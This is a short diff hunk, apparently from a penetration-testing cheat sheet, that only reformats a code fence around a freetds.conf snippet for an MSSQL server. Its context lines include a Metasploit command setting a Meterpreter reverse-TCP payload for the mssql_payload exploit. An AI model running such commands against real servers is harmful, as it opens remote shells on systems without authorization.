@@ -12,7 +12,8 @@
 - msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
 
 #### mssql server config file
-```cat freetds.conf
+```
+cat freetds.conf
 
 host = $ip
 port = 1433
